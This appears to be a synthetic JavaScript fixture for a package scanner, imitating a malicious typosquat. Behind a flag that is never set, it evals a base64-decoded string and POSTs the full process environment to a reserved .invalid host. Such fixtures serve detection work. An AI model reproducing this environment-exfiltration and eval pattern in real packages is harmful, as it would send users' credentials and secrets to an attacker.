// SYNTHETIC FIXTURE for SENTINEL-SC — imitates patterns seen in malicious typosquats.
// It contains no functional payload: the encoded string decodes to console.log("demo"),
// the request targets a reserved .invalid domain, and the file is never executed by the scanner.
const https = require('https');
const payload = Buffer.from('Y29uc29sZS5sb2coImRlbW8iKQ==', 'base64').toString();
const info = JSON.stringify(process.env);
if (process.env.SENTINEL_FIXTURE_NEVER_SET === 'yes') {
  eval(payload);
  https.request({ host: 'collector.example.invalid', path: '/c', method: 'POST' }).end(info);
}
module.exports = {};
